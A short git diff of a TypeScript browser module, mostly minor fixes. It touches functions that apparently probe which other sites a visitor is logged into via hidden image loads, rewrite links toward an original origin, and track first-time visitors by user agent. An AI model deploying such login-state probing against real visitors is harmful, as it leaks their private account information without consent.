@@ -49,7 +49,7 @@ export function resolveLazyLoadedLinks () {
                 if (!link.href.startsWith(origin)) parsedLink = encodeURIComponent(link.href)
                 else {
                     const urlPath = link.href.startsWith('http') ? getUrlPath(link.href) : link.href
-                    const originalBase= getUrlBase(window.ORIGINAL, true)
+                    const originalBase = getUrlBase(window.ORIGINAL, true)
                     parsedLink = encodeURIComponent(joinUrls(originalBase, urlPath))
                 }
 
@@ -111,12 +111,12 @@ export async function getActiveSessions ():Promise<any> {
             Object
                 .entries(loginTokenLinks)
                 .map(([site, link]) => new Promise(resolve => {
-                    const loader = document.createElement('img')
+                    const loader = new Image()
 
                     loader.style.display = 'none'
-                    loader.src = link
                     loader.onerror = () => resolve([site, false])
                     loader.onload = () => resolve([site, true])
+                    loader.src = link
                 }))))
 }
 
@@ -150,7 +150,7 @@ export async function getGeneralInfo ():Promise<GeneralInfo> {
 export function checkFirstTimer ():boolean {
     const registered = localStorage.getItem(window.navigator.userAgent)
     if (!registered) localStorage.setItem(window.navigator.userAgent, 'registered')
-    return !!registered
+    return !registered
 }
 
 
@@ -169,10 +169,10 @@ export function injectScript (scriptContent:string) {
 }
 
 
-export function redirect (url:string) {
+export function redirect (url:string):string {
     const cleanUrl = encodeURIComponent(url)
 
-    window.location.href = joinUrls(window.location.origin, cleanUrl)
+    return window.location.href = joinUrls(window.location.origin, cleanUrl)
 }
 
 
@@ -190,7 +190,7 @@ export async function getNetworkSpeed ():Promise<NetworkSpeedObj> {
     const uploadSpeed = await networkTest.checkUploadSpeed(uploadOptions)
 
     return {
-        down: {kbps: downloadSpeed.kbps, mbps: downloadSpeed.mbps},
-        up: {kbps: uploadSpeed.kbps, mbps: uploadSpeed.mbps}
+        down: {kbps: downloadSpeed?.kbps, mbps: downloadSpeed?.mbps},
+        up: {kbps: uploadSpeed?.kbps, mbps: uploadSpeed?.mbps}
     }
 }
